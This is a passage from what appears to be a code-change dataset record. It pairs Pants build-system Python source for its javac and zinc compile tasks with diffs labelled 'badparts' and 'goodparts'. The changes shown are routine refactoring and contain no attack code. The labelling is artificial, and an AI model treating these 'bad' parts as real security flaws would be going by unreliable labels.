tuple(\n            fast_relpath(a, buildroot)\n            for a in (self.zinc, self.compiler_bridge, self.compiler_interface)\n          )\n        ),\n        buildroot,\n      ),\n    ))[0]\n\n  # TODO: Make rebase map work without needing to pass in absolute paths:\n  # https://github.com/pantsbuild/pants/issues/6434\n  @memoized_property\n  def rebase_map_args(self):\n    \"\"\"We rebase known stable paths in zinc analysis to make it portable across machines.\"\"\"\n    rebases = {\n        self.dist.real_home: '/dev/null/remapped_by_pants/java_home/',\n        get_buildroot(): '/dev/null/remapped_by_pants/buildroot/',\n        self._zinc_factory.get_options().pants_workdir: '/dev/null/remapped_by_pants/workdir/',\n      }\n    return (\n        '-rebase-map',\n        ','.join('{}:{}'.format(src, dst) for src, dst in rebases.items())\n      )\n\n  @memoized_method\n  def _compiler_plugins_cp_entries(self):\n    \"\"\"Any additional global compiletime classpath entries for compiler plugins.\"\"\"\n    java_options_src = Java.global_instance()\n    scala_options_src = ScalaPlatform.global_instance()\n\n    def cp(instance, toolname):\n      scope = instance.options_scope\n      return instance.tool_classpath_from_products(self._products, toolname, scope=scope)\n    classpaths = (cp(java_options_src, 'javac-plugin-dep') +\n                  cp(scala_options_src, 'scalac-plugin-dep'))\n    return [(conf, ClasspathEntry(jar)) for conf in self.DEFAULT_CONFS for jar in classpaths]\n\n  @memoized_property\n  def extractor(self):\n    return self._zinc_factory.tool_classpath_from_products(self._products,\n                                                           self.ZINC_EXTRACTOR_TOOL_NAME,\n                                                           scope=self._zinc_factory.options_scope)\n\n  def compile_classpath_entries(self, classpath_product_key, target, extra_cp_entries=None):\n    classpath_product = self._products.get_data(classpath_product_key)\n    if DependencyContext.global_instance().defaulted_property(target, lambda x: x.strict_deps):\n      dependencies = target.strict_dependencies(DependencyContext.global_instance())\n    else:\n      dependencies = DependencyContext.global_instance().all_dependencies(target)\n\n    all_extra_cp_entries = list(self._compiler_plugins_cp_entries())\n    if extra_cp_entries:\n      all_extra_cp_entries.extend(extra_cp_entries)\n\n    # TODO: We convert dependencies to an iterator here in order to _preserve_ a bug that will be\n    # fixed in https://github.com/pantsbuild/pants/issues/4874: `ClasspathUtil.compute_classpath`\n    # expects to receive a list, but had been receiving an iterator. In the context of an\n    # iterator, `excludes` are not applied\n    # in ClasspathProducts.get_product_target_mappings_for_targets.\n    return ClasspathUtil.compute_classpath_entries(iter(dependencies),\n      classpath_product,\n      all_extra_cp_entries,\n      self.DEFAULT_CONFS,\n    )\n\n  def compile_classpath(self, classpath_product_key, target, extra_cp_entries=None):\n    \"\"\"Compute the compile classpath for the given target.\"\"\"\n    return list(\n      entry.path\n      for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)\n    )\n"}, "/src/python/pants/backend/jvm/tasks/jvm_compile/javac/javac_compile.py": {"changes": [{"diff": "\n       output_files=output_files,\n       description='Compiling {} with javac'.format(ctx.target.address.spec),\n     )\n-    exec_result = self.context.execute_process_synchronously(\n+    exec_result = self.context.execute_process_synchronously_without_raising(\n       exec_process_request,\n       'javac',\n       (WorkUnitLabel.TASK, WorkUnitLabel.JV", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/jvm/tasks/jvm_compile/javac/javac_compile.py", "badparts": ["    exec_result = self.context.execute_process_synchronously("], "goodparts": ["    exec_result = self.context.execute_process_synchronously_without_raising("]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals import logging import os from builtins import str from future.utils import text_type from pants.backend.jvm import argfile from pants.backend.jvm.subsystems.java import Java from pants.backend.jvm.subsystems.jvm_platform import JvmPlatform from pants.backend.jvm.targets.annotation_processor import AnnotationProcessor from pants.backend.jvm.targets.javac_plugin import JavacPlugin from pants.backend.jvm.targets.jvm_target import JvmTarget from pants.backend.jvm.tasks.jvm_compile.jvm_compile import JvmCompile from pants.base.exceptions import TaskError from pants.base.workunit import WorkUnit, WorkUnitLabel from pants.engine.fs import DirectoryToMaterialize from pants.engine.isolated_process import ExecuteProcessRequest from pants.java.distribution.distribution import DistributionLocator from pants.util.dirutil import safe_open from pants.util.process_handler import subprocess _JAVAC_PLUGIN_INFO_FILE='META-INF/services/com.sun.source.util.Plugin' _PROCESSOR_INFO_FILE='META-INF/services/javax.annotation.processing.Processor' logger=logging.getLogger(__name__) class JavacCompile(JvmCompile): \"\"\"Compile Java code using Javac.\"\"\" _name='java' @staticmethod def _write_javac_plugin_info(resources_dir, javac_plugin_target): javac_plugin_info_file=os.path.join(resources_dir, _JAVAC_PLUGIN_INFO_FILE) with safe_open(javac_plugin_info_file, 'w') as f: f.write(javac_plugin_target.classname) @classmethod def get_args_default(cls, bootstrap_option_values): return('-encoding', 'UTF-8') @classmethod def get_warning_args_default(cls): return('-deprecation', '-Xlint:all', '-Xlint:-serial', '-Xlint:-path') @classmethod def get_no_warning_args_default(cls): return('-nowarn', '-Xlint:none',) @classmethod def get_fatal_warnings_enabled_args_default(cls): return('-Werror',) @classmethod def get_fatal_warnings_disabled_args_default(cls): return() @classmethod def register_options(cls, register): super(JavacCompile, cls).register_options(register) @classmethod def subsystem_dependencies(cls): return super(JavacCompile, cls).subsystem_dependencies() +(JvmPlatform,) @classmethod def prepare(cls, options, round_manager): super(JavacCompile, cls).prepare(options, round_manager) @classmethod def product_types(cls): return['runtime_classpath'] def __init__(self, *args, **kwargs): super(JavacCompile, self).__init__(*args, **kwargs) self.set_distribution(jdk=True) def select(self, target): if not isinstance(target, JvmTarget): return False return target.has_sources('.java') def select_source(self, source_file_path): return source_file_path.endswith('.java') def javac_classpath(self): return Java.global_javac_classpath(self.context.products) def write_extra_resources(self, compile_context): \"\"\"Override write_extra_resources to produce plugin and annotation processor files.\"\"\" target=compile_context.target if isinstance(target, JavacPlugin): self._write_javac_plugin_info(compile_context.classes_dir, target) elif isinstance(target, AnnotationProcessor) and target.processors: processor_info_file=os.path.join(compile_context.classes_dir, _PROCESSOR_INFO_FILE) self._write_processor_info(processor_info_file, target.processors) def _write_processor_info(self, processor_info_file, processors): with safe_open(processor_info_file, 'w') as f: for processor in processors: f.write('{}\\n'.format(processor.strip())) def execute(self): if JvmPlatform.global_instance().get_options().compiler=='javac': return super(JavacCompile, self).execute() def compile(self, ctx, args, dependency_classpath, upstream_analysis, settings, fatal_warnings, zinc_file_manager, javac_plugin_map, scalac_plugin_map): classpath=(ctx.classes_dir,) +tuple(ce.path for ce in dependency_classpath) if self.get_options().capture_classpath: self._record_compile_classpath(classpath, ctx.target, ctx.classes_dir) try: distribution=JvmPlatform.preferred_jvm_distribution([settings], strict=True) except DistributionLocator.Error: distribution=JvmPlatform.preferred_jvm_distribution([settings], strict=False) javac_cmd=['{}/bin/javac'.format(distribution.real_home)] javac_cmd.extend([ '-classpath', ':'.join(classpath), ]) if settings.args: settings_args=settings.args if any('$JAVA_HOME' in a for a in settings.args): logger.debug('Substituting \"$JAVA_HOME\" with \"{}\" in jvm-platform args.' .format(distribution.home)) settings_args=(a.replace('$JAVA_HOME', distribution.home) for a in settings.args) javac_cmd.extend(settings_args) javac_cmd.extend([ '-source', str(settings.source_level), '-target', str(settings.target_level), ]) if self.execution_strategy==self.HERMETIC: javac_cmd.extend([ '-d', '.', ]) else: javac_cmd.extend([ '-d', ctx.classes_dir, ]) javac_cmd.extend(self._javac_plugin_args(javac_plugin_map)) javac_cmd.extend(args) if fatal_warnings: javac_cmd.extend(self.get_options().fatal_warnings_enabled_args) else: javac_cmd.extend(self.get_options().fatal_warnings_disabled_args) with argfile.safe_args(ctx.sources, self.get_options()) as batched_sources: javac_cmd.extend(batched_sources) if self.execution_strategy==self.HERMETIC: self._execute_hermetic_compile(javac_cmd, ctx) else: with self.context.new_workunit(name='javac', cmd=' '.join(javac_cmd), labels=[WorkUnitLabel.COMPILER]) as workunit: self.context.log.debug('Executing{}'.format(' '.join(javac_cmd))) p=subprocess.Popen(javac_cmd, stdout=workunit.output('stdout'), stderr=workunit.output('stderr')) return_code=p.wait() workunit.set_outcome(WorkUnit.FAILURE if return_code else WorkUnit.SUCCESS) if return_code: raise TaskError('javac exited with return code{rc}'.format(rc=return_code)) @classmethod def _javac_plugin_args(cls, javac_plugin_map): ret=[] for plugin, args in javac_plugin_map.items(): for arg in args: if ' ' in arg: raise TaskError('javac plugin args must not contain spaces ' '(arg{} for plugin{})'.format(arg, plugin)) ret.append('-Xplugin:{}{}'.format(plugin, ' '.join(args))) return ret def _execute_hermetic_compile(self, cmd, ctx): input_snapshot=ctx.target.sources_snapshot(scheduler=self.context._scheduler) output_files=tuple( os.path.relpath(f.path.replace('.java', '.class'), ctx.target.target_base) for f in input_snapshot.files if f.path.endswith('.java') ) exec_process_request=ExecuteProcessRequest( argv=tuple(cmd), input_files=input_snapshot.directory_digest, output_files=output_files, description='Compiling{} with javac'.format(ctx.target.address.spec), ) exec_result=self.context.execute_process_synchronously( exec_process_request, 'javac', (WorkUnitLabel.TASK, WorkUnitLabel.JVM), ) classes_directory=ctx.classes_dir self.context._scheduler.materialize_directories(( DirectoryToMaterialize(text_type(classes_directory), exec_result.output_directory_digest), )) ", "sourceWithComments": "# coding=utf-8\n# Copyright 2018 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport logging\nimport os\nfrom builtins import str\n\nfrom future.utils import text_type\n\nfrom pants.backend.jvm import argfile\nfrom pants.backend.jvm.subsystems.java import Java\nfrom pants.backend.jvm.subsystems.jvm_platform import JvmPlatform\nfrom pants.backend.jvm.targets.annotation_processor import AnnotationProcessor\nfrom pants.backend.jvm.targets.javac_plugin import JavacPlugin\nfrom pants.backend.jvm.targets.jvm_target import JvmTarget\nfrom pants.backend.jvm.tasks.jvm_compile.jvm_compile import JvmCompile\nfrom pants.base.exceptions import TaskError\nfrom pants.base.workunit import WorkUnit, WorkUnitLabel\nfrom pants.engine.fs import DirectoryToMaterialize\nfrom pants.engine.isolated_process import ExecuteProcessRequest\nfrom pants.java.distribution.distribution import DistributionLocator\nfrom pants.util.dirutil import safe_open\nfrom pants.util.process_handler import subprocess\n\n\n# Well known metadata file to register javac plugins.\n_JAVAC_PLUGIN_INFO_FILE = 'META-INF/services/com.sun.source.util.Plugin'\n\n# Well known metadata file to register annotation processors with a java 1.6+ compiler.\n_PROCESSOR_INFO_FILE = 'META-INF/services/javax.annotation.processing.Processor'\n\nlogger = logging.getLogger(__name__)\n\n\nclass JavacCompile(JvmCompile):\n  \"\"\"Compile Java code using Javac.\"\"\"\n\n  _name = 'java'\n\n  @staticmethod\n  def _write_javac_plugin_info(resources_dir, javac_plugin_target):\n    javac_plugin_info_file = os.path.join(resources_dir, _JAVAC_PLUGIN_INFO_FILE)\n    with safe_open(javac_plugin_info_file, 'w') as f:\n      f.write(javac_plugin_target.classname)\n\n  @classmethod\n  def get_args_default(cls, bootstrap_option_values):\n    return ('-encoding', 'UTF-8')\n\n  @classmethod\n  def get_warning_args_default(cls):\n    return ('-deprecation', '-Xlint:all', '-Xlint:-serial', '-Xlint:-path')\n\n  @classmethod\n  def get_no_warning_args_default(cls):\n    return ('-nowarn', '-Xlint:none', )\n\n  @classmethod\n  def get_fatal_warnings_enabled_args_default(cls):\n    return ('-Werror',)\n\n  @classmethod\n  def get_fatal_warnings_disabled_args_default(cls):\n    return ()\n\n  @classmethod\n  def register_options(cls, register):\n    super(JavacCompile, cls).register_options(register)\n\n  @classmethod\n  def subsystem_dependencies(cls):\n    return super(JavacCompile, cls).subsystem_dependencies() + (JvmPlatform,)\n\n  @classmethod\n  def prepare(cls, options, round_manager):\n    super(JavacCompile, cls).prepare(options, round_manager)\n\n  @classmethod\n  def product_types(cls):\n    return ['runtime_classpath']\n\n  def __init__(self, *args, **kwargs):\n    super(JavacCompile, self).__init__(*args, **kwargs)\n    self.set_distribution(jdk=True)\n\n  def select(self, target):\n    if not isinstance(target, JvmTarget):\n      return False\n    return target.has_sources('.java')\n\n  def select_source(self, source_file_path):\n    return source_file_path.endswith('.java')\n\n  def javac_classpath(self):\n    # Note that if this classpath is empty then Javac will automatically use the javac from\n    # the JDK it was invoked with.\n    return Java.global_javac_classpath(self.context.products)\n\n  def write_extra_resources(self, compile_context):\n    \"\"\"Override write_extra_resources to produce plugin and annotation processor files.\"\"\"\n    target = compile_context.target\n    if isinstance(target, JavacPlugin):\n      self._write_javac_plugin_info(compile_context.classes_dir, target)\n    elif isinstance(target, AnnotationProcessor) and target.processors:\n      processor_info_file = os.path.join(compile_context.classes_dir, _PROCESSOR_INFO_FILE)\n      self._write_processor_info(processor_info_file, target.processors)\n\n  def _write_processor_info(self, processor_info_file, processors):\n    with safe_open(processor_info_file, 'w') as f:\n      for processor in processors:\n        f.write('{}\\n'.format(processor.strip()))\n\n  def execute(self):\n    if JvmPlatform.global_instance().get_options().compiler == 'javac':\n      return super(JavacCompile, self).execute()\n\n  def compile(self, ctx, args, dependency_classpath, upstream_analysis,\n              settings, fatal_warnings, zinc_file_manager,\n              javac_plugin_map, scalac_plugin_map):\n    classpath = (ctx.classes_dir,) + tuple(ce.path for ce in dependency_classpath)\n\n    if self.get_options().capture_classpath:\n      self._record_compile_classpath(classpath, ctx.target, ctx.classes_dir)\n\n    try:\n      distribution = JvmPlatform.preferred_jvm_distribution([settings], strict=True)\n    except DistributionLocator.Error:\n      distribution = JvmPlatform.preferred_jvm_distribution([settings], strict=False)\n\n    javac_cmd = ['{}/bin/javac'.format(distribution.real_home)]\n\n    javac_cmd.extend([\n      '-classpath', ':'.join(classpath),\n    ])\n\n    if settings.args:\n      settings_args = settings.args\n      if any('$JAVA_HOME' in a for a in settings.args):\n        logger.debug('Substituting \"$JAVA_HOME\" with \"{}\" in jvm-platform args.'\n                     .format(distribution.home))\n        settings_args = (a.replace('$JAVA_HOME', distribution.home) for a in settings.args)\n      javac_cmd.extend(settings_args)\n\n      javac_cmd.extend([\n        # TODO: support -release\n        '-source', str(settings.source_level),\n        '-target', str(settings.target_level),\n      ])\n\n    if self.execution_strategy == self.HERMETIC:\n      javac_cmd.extend([\n        # We need to strip the source root from our output files. Outputting to a directory, and\n        # capturing that directory, does the job.\n        # Unfortunately, javac errors if the directory you pass to -d doesn't exist, and we don't\n        # have a convenient way of making a directory in the output tree, so let's just use the\n        # working directory as our output dir.\n        # This also has the benefit of not needing to strip leading directories from the returned\n        # snapshot.\n        '-d', '.',\n      ])\n    else:\n      javac_cmd.extend([\n        '-d', ctx.classes_dir,\n      ])\n\n    javac_cmd.extend(self._javac_plugin_args(javac_plugin_map))\n\n    javac_cmd.extend(args)\n\n    if fatal_warnings:\n      javac_cmd.extend(self.get_options().fatal_warnings_enabled_args)\n    else:\n      javac_cmd.extend(self.get_options().fatal_warnings_disabled_args)\n\n    with argfile.safe_args(ctx.sources, self.get_options()) as batched_sources:\n      javac_cmd.extend(batched_sources)\n\n      if self.execution_strategy == self.HERMETIC:\n        self._execute_hermetic_compile(javac_cmd, ctx)\n      else:\n        with self.context.new_workunit(name='javac',\n                                       cmd=' '.join(javac_cmd),\n                                       labels=[WorkUnitLabel.COMPILER]) as workunit:\n          self.context.log.debug('Executing {}'.format(' '.join(javac_cmd)))\n          p = subprocess.Popen(javac_cmd, stdout=workunit.output('stdout'), stderr=workunit.output('stderr'))\n          return_code = p.wait()\n          workunit.set_outcome(WorkUnit.FAILURE if return_code else WorkUnit.SUCCESS)\n          if return_code:\n            raise TaskError('javac exited with return code {rc}'.format(rc=return_code))\n\n  @classmethod\n  def _javac_plugin_args(cls, javac_plugin_map):\n    ret = []\n    for plugin, args in javac_plugin_map.items():\n      for arg in args:\n        if ' ' in arg:\n          # Note: Args are separated by spaces, and there is no way to escape embedded spaces, as\n          # javac's Main does a simple split on these strings.\n          raise TaskError('javac plugin args must not contain spaces '\n                          '(arg {} for plugin {})'.format(arg, plugin))\n      ret.append('-Xplugin:{} {}'.format(plugin, ' '.join(args)))\n    return ret\n\n  def _execute_hermetic_compile(self, cmd, ctx):\n    # For now, executing a compile remotely only works for targets that\n    # do not have any dependencies or inner classes\n\n    input_snapshot = ctx.target.sources_snapshot(scheduler=self.context._scheduler)\n    output_files = tuple(\n      # Assume no extra .class files to grab. We'll fix up that case soon.\n      # Drop the source_root from the file path.\n      # Assumes `-d .` has been put in the command.\n      os.path.relpath(f.path.replace('.java', '.class'), ctx.target.target_base)\n      for f in input_snapshot.files if f.path.endswith('.java')\n    )\n    exec_process_request = ExecuteProcessRequest(\n      argv=tuple(cmd),\n      input_files=input_snapshot.directory_digest,\n      output_files=output_files,\n      description='Compiling {} with javac'.format(ctx.target.address.spec),\n    )\n    exec_result = self.context.execute_process_synchronously(\n      exec_process_request,\n      'javac',\n      (WorkUnitLabel.TASK, WorkUnitLabel.JVM),\n    )\n\n    # Dump the output to the .pants.d directory where it's expected by downstream tasks.\n    classes_directory = ctx.classes_dir\n    self.context._scheduler.materialize_directories((\n      DirectoryToMaterialize(text_type(classes_directory), exec_result.output_directory_digest),\n    ))\n"}, "/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py": {"changes": [{"diff": "\n from builtins import open\n from collections import defaultdict\n from contextlib import closing\n-from hashlib import sha1\n from xml.etree import ElementTree\n \n from future.utils import PY3, text_type\n", "add": 0, "remove": 1, "filename": "/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py", "badparts": ["from hashlib import sha1"], "goodparts": []}, {"diff": "\n       for processor in processors:\n         f.write('{}\\n'.format(processor.strip()))\n \n-  @memoized_property\n-  def _zinc_cache_dir(self):\n-    \"\"\"A directory where zinc can store compiled copies of the `compiler-bridge`.\n-\n-    The compiler-bridge is specific to each scala version, and is lazily computed by zinc if the\n-    appropriate version does not exist. Eventually it would be great to just fetch this rather\n-    than compiling it.\n-    \"\"\"\n-    hasher = sha1()\n-    for cp_entry in [self._zinc.zinc, self._zinc.compiler_interface, self._zinc.compiler_bridge]:\n-      hasher.update(os.path.relpath(cp_entry, self.get_options().pants_workdir))\n-    key = hasher.hexdigest()[:12]\n-    return os.path.join(self.get_options().pants_bootstrapdir, 'zinc', key)\n-\n   def compile(self, ctx, args, dependency_classpath, upstream_analysis,\n               settings, compiler_option_sets, zinc_file_manager,\n               javac_plugin_map, scalac_plugin_map):\n", "add": 0, "remove": 14, "filename": "/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py", "badparts": ["  @memoized_property", "  def _zinc_cache_dir(self):", "    \"\"\"A directory where zinc can store compiled copies of the `compiler-bridge`.", "    The compiler-bridge is specific to each scala version, and is lazily computed by zinc if the", "    appropriate version does not exist. Eventually it would be great to just fetch this rather", "    than compiling it.", "    \"\"\"", "    hasher = sha1()", "    for cp_entry in [self._zinc.zinc, self._zinc.compiler_interface, self._zinc.compiler_bridge]:", "      hasher.update(os.path.relpath(cp_entry, self.get_options().pants_workdir))", "    key = hasher.hexdigest()[:12]", "    return os.path.join(self.get_options().pants_bootstrapdir, 'zinc', key)"], "goodparts": []}, {"diff": "\n       return fast_relpath(path, get_buildroot())\n \n     scala_path = self.scalac_classpath()\n-    compiler_interface = self._zinc.compiler_interface\n-    compiler_bridge = self._zinc.compiler_bridge\n     classes_dir = ctx.classes_dir\n     analysis_cache = ctx.analysis_file\n \n     scala_path = tuple(relative_to_exec_root(c) for c in scala_path)\n-    compiler_interface = relative_to_exec_root(compiler_interface)\n-    compiler_bridge = relative_to_exec_root(compiler_bridge)\n     analysis_cache = relative_to_exec_root(analysis_cache)\n     classes_dir = relative_to_exec_root(classes_dir)\n     # TODO: Have these produced correctly, rather than having to relativize them here\n", "add": 0, "remove": 4, "filename": "/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py", "badparts": ["    compiler_interface = self._zinc.compiler_interface", "    compiler_bridge = self._zinc.compiler_bridge", "    compiler_interface = relative_to_exec_root(compiler_interface)", "    compiler_bridge = relative_to_exec_root(compiler_bridge)"], "goodparts": []}, {"diff": "\n     if not self.get_options().colors:\n       zinc_args.append('-no-color')\n \n-    zinc_args.extend(['-compiler-interface', compiler_interface])\n-    zinc_args.extend(['-compiler-bridge', compiler_bridge])\n-    # TODO: Kill zinc-cache-dir: https://github.com/pantsbuild/pants/issues/6155\n-    # But for now, this will probably fail remotely because the homedir probably doesn't exist.\n-    zinc_args.extend(['-zinc-cache-dir', self._zinc_cache_dir])\n+    compiler_bridge_classpath_entry = self._zinc.compile_compiler_bridge(self.context)\n+    zinc_args.extend(['-compiled-bridge-jar', compiler_bridge_classpath_entry.path])\n     zinc_args.extend(['-scala-path', ':'.join(scala_path)])\n \n     zinc_args.extend(self._javac_plugin_args(javac_plugin_map))\n", "add": 2, "remove": 5, "filename": "/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py", "badparts": ["    zinc_args.extend(['-compiler-interface', compiler_interface])", "    zinc_args.extend(['-compiler-bridge', compiler_bridge])", "    zinc_args.extend(['-zinc-cache-dir', self._zinc_cache_dir])"], "goodparts": ["    compiler_bridge_classpath_entry = self._zinc.compile_compiler_bridge(self.context)", "    zinc_args.extend(['-compiled-bridge-jar', compiler_bridge_classpath_entry.path])"]}, {"diff": "\n         ctx.target.sources_snapshot(self.context._scheduler),\n       ]\n \n+      relevant_classpath_entries = dependency_classpath + [compiler_bridge_classpath_entry]\n       directory_digests = tuple(\n-        entry.directory_digest for entry in dependency_classpath if entry.directory_digest\n+        entry.directory_digest for entry in relevant_classpath_entries if entry.directory_digest\n       )\n-      if len(directory_digests) != len(dependency_classpath):\n-        for dep in dependency_classpath:\n+      if len(directory_digests) != len(relevant_classpath_entries):\n+        for dep in relevant_classpath_entries:\n           if dep.directory_digest is None:\n             logger.warning(\n               \"ClasspathEntry {} didn't have a DirectoryDigest, so won't be present for hermetic \"\n", "add": 4, "remove": 3, "filename": "/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py", "badparts": ["        entry.directory_digest for entry in dependency_classpath if entry.directory_digest", "      if len(directory_digests) != len(dependency_classpath):", "        for dep in dependency_classpath:"], "goodparts": ["      relevant_classpath_entries = dependency_classpath + [compiler_bridge_classpath_entry]", "        entry.directory_digest for entry in relevant_classpath_entries if entry.directory_digest", "      if len(directory_digests) != len(relevant_classpath_entries):", "        for dep in relevant_classpath_entries:"]}, {"diff": "\n         # TODO: These should always be unicodes\n         jdk_home=text_type(self._zinc.dist.home),\n       )\n-      res = self.context.execute_process_synchronously(req, self.name(), [WorkUnitLabel.COMPILER])\n+      res = self.context.execute_process_synchronously_without_raising(req, self.name(), [WorkUnitLabel.COMPILER])\n       # TODO: Materialize as a batch in do_compile or somewhere\n       self.context._scheduler.materialize_directories((\n         DirectoryToMaterialize(get_buildroot(), res.output_directory_dige", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/jvm/tasks/jvm_compile/zinc/zinc_compile.py", "badparts": ["      res = self.context.execute_process_synchronously(req, self.name(), [WorkUnitLabel.COMPILER])"], "goodparts": ["      res = self.context.execute_process_synchronously_without_raising(req, self.name(), [WorkUnitLabel.COMPILER])"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals import errno import logging import os import re import textwrap from builtins import open from collections import defaultdict from contextlib import closing from hashlib import sha1 from xml.etree import ElementTree from future.utils import PY3, text_type from pants.backend.jvm.subsystems.java import Java from pants.backend.jvm.subsystems.jvm_platform import JvmPlatform from pants.backend.jvm.subsystems.scala_platform import ScalaPlatform from pants.backend.jvm.subsystems.zinc import Zinc from pants.backend.jvm.targets.annotation_processor import AnnotationProcessor from pants.backend.jvm.targets.javac_plugin import JavacPlugin from pants.backend.jvm.targets.jvm_target import JvmTarget from pants.backend.jvm.targets.scalac_plugin import ScalacPlugin from pants.backend.jvm.tasks.classpath_util import ClasspathUtil from pants.backend.jvm.tasks.jvm_compile.jvm_compile import JvmCompile from pants.base.build_environment import get_buildroot from pants.base.exceptions import TaskError from pants.base.hash_utils import hash_file from pants.base.workunit import WorkUnitLabel from pants.engine.fs import DirectoryToMaterialize, PathGlobs, PathGlobsAndRoot from pants.engine.isolated_process import ExecuteProcessRequest from pants.java.distribution.distribution import DistributionLocator from pants.util.contextutil import open_zip from pants.util.dirutil import fast_relpath, safe_open from pants.util.memo import memoized_method, memoized_property _SCALAC_PLUGIN_INFO_FILE='scalac-plugin.xml' _JAVAC_PLUGIN_INFO_FILE='META-INF/services/com.sun.source.util.Plugin' _PROCESSOR_INFO_FILE='META-INF/services/javax.annotation.processing.Processor' logger=logging.getLogger(__name__) class BaseZincCompile(JvmCompile): \"\"\"An abstract base class for zinc compilation tasks.\"\"\" _name='zinc' @staticmethod def _write_scalac_plugin_info(resources_dir, scalac_plugin_target): scalac_plugin_info_file=os.path.join(resources_dir, _SCALAC_PLUGIN_INFO_FILE) with safe_open(scalac_plugin_info_file, 'w') as f: f.write(textwrap.dedent(\"\"\" <plugin> <name>{}</name> <classname>{}</classname> </plugin> \"\"\".format(scalac_plugin_target.plugin, scalac_plugin_target.classname)).strip()) @staticmethod def _write_javac_plugin_info(resources_dir, javac_plugin_target): javac_plugin_info_file=os.path.join(resources_dir, _JAVAC_PLUGIN_INFO_FILE) with safe_open(javac_plugin_info_file, 'w') as f: classname=javac_plugin_target.classname if PY3 else javac_plugin_target.classname.decode('utf-8') f.write(classname) @staticmethod def validate_arguments(log, whitelisted_args, args): \"\"\"Validate that all arguments match whitelisted regexes.\"\"\" valid_patterns={re.compile(p): v for p, v in whitelisted_args.items()} def validate(idx): arg=args[idx] for pattern, has_argument in valid_patterns.items(): if pattern.match(arg): return 2 if has_argument else 1 log.warn(\"Zinc argument '{}' is not supported, and is subject to change/removal!\".format(arg)) return 1 arg_index=0 while arg_index < len(args): arg_index +=validate(arg_index) @staticmethod def _get_zinc_arguments(settings): \"\"\"Extracts and formats the zinc arguments given in the jvm platform settings. This is responsible for the symbol substitution which replaces $JAVA_HOME with the path to an appropriate jvm distribution. :param settings: The jvm platform settings from which to extract the arguments. :type settings::class:`JvmPlatformSettings` \"\"\" zinc_args=[ '-C-source', '-C{}'.format(settings.source_level), '-C-target', '-C{}'.format(settings.target_level), ] if settings.args: settings_args=settings.args if any('$JAVA_HOME' in a for a in settings.args): try: distribution=JvmPlatform.preferred_jvm_distribution([settings], strict=True) except DistributionLocator.Error: distribution=JvmPlatform.preferred_jvm_distribution([settings], strict=False) logger.debug('Substituting \"$JAVA_HOME\" with \"{}\" in jvm-platform args.' .format(distribution.home)) settings_args=(a.replace('$JAVA_HOME', distribution.home) for a in settings.args) zinc_args.extend(settings_args) return zinc_args @classmethod def implementation_version(cls): return super(BaseZincCompile, cls).implementation_version() +[('BaseZincCompile', 7)] @classmethod def get_jvm_options_default(cls, bootstrap_option_values): return('-Dfile.encoding=UTF-8', '-Dzinc.analysis.cache.limit=1000', '-Djava.awt.headless=true', '-Xmx2g') @classmethod def get_args_default(cls, bootstrap_option_values): return('-C-encoding', '-CUTF-8', '-S-encoding', '-SUTF-8', '-S-g:vars') @classmethod def get_warning_args_default(cls): return('-C-deprecation', '-C-Xlint:all', '-C-Xlint:-serial', '-C-Xlint:-path', '-S-deprecation', '-S-unchecked', '-S-Xlint') @classmethod def get_no_warning_args_default(cls): return('-C-nowarn', '-C-Xlint:none', '-S-nowarn', '-S-Xlint:none',) @classmethod def get_fatal_warnings_enabled_args_default(cls): return('-S-Xfatal-warnings', '-C-Werror') @classmethod def get_fatal_warnings_disabled_args_default(cls): return() @classmethod def register_options(cls, register): super(BaseZincCompile, cls).register_options(register) register('--whitelisted-args', advanced=True, type=dict, default={ '-S.*': False, '-C.*': False, '-file-filter': True, '-msg-filter': True, }, help='A dict of option regexes that make up pants\\' supported API for zinc. ' 'Options not listed here are subject to change/removal. The value of the dict ' 'indicates that an option accepts an argument.') register('--incremental', advanced=True, type=bool, default=True, help='When set, zinc will use sub-target incremental compilation, which dramatically ' 'improves compile performance while changing large targets. When unset, ' 'changed targets will be compiled with an empty output directory, as if after ' 'running clean-all.') register('--incremental-caching', advanced=True, type=bool, help='When set, the results of incremental compiles will be written to the cache. ' 'This is unset by default, because it is generally a good precaution to cache ' 'only clean/cold builds.') @classmethod def subsystem_dependencies(cls): return super(BaseZincCompile, cls).subsystem_dependencies() +(Zinc.Factory, JvmPlatform,) @classmethod def prepare(cls, options, round_manager): super(BaseZincCompile, cls).prepare(options, round_manager) ScalaPlatform.prepare_tools(round_manager) @property def incremental(self): \"\"\"Zinc implements incremental compilation. Setting this property causes the task infrastructure to clone the previous results_dir for a target into the new results_dir for a target. \"\"\" return self.get_options().incremental @property def cache_incremental(self): \"\"\"Optionally write the results of incremental compiles to the cache.\"\"\" return self.get_options().incremental_caching @memoized_property def _zinc(self): return Zinc.Factory.global_instance().create(self.context.products) def __init__(self, *args, **kwargs): super(BaseZincCompile, self).__init__(*args, **kwargs) self._processor_info_dir=os.path.join(self.workdir, 'apt-processor-info') ZincCompile.validate_arguments(self.context.log, self.get_options().whitelisted_args, self._args) if self.execution_strategy==self.HERMETIC: try: fast_relpath(self.get_options().pants_workdir, get_buildroot()) except ValueError: raise TaskError( \"Hermetic zinc execution currently requires the workdir to be a child of the buildroot \" \"but workdir was{} and buildroot was{}\".format( self.get_options().pants_workdir, get_buildroot(), ) ) if self.get_options().use_classpath_jars: raise TaskError(\"Hermetic zinc execution currently doesn't work with classpath jars\") def select(self, target): raise NotImplementedError() def select_source(self, source_file_path): raise NotImplementedError() def register_extra_products_from_contexts(self, targets, compile_contexts): compile_contexts=[self.select_runtime_context(compile_contexts[t]) for t in targets] zinc_analysis=self.context.products.get_data('zinc_analysis') zinc_args=self.context.products.get_data('zinc_args') if zinc_analysis is not None: for compile_context in compile_contexts: zinc_analysis[compile_context.target]=(compile_context.classes_dir, compile_context.jar_file, compile_context.analysis_file) if zinc_args is not None: for 